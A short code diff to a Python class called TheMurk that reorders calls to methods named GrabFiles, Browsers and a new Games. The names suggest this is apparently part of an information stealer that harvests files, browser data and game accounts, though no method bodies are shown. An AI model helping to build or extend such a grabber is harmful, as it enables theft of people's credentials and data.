@@ -15,7 +15,6 @@ class TheMurk:
     def __init__(self) -> None:
         self.MainVars()
         self.Progress()
-        self.Browsers()
     
     def MainVars(self):
         self.name = ''
@@ -31,6 +30,8 @@ class TheMurk:
     def Progress(self):
         self.Start()
         self.GrabFiles()
+        self.Browsers()
+        self.Games()
 
     def Start(self):
         if not config.debuging:
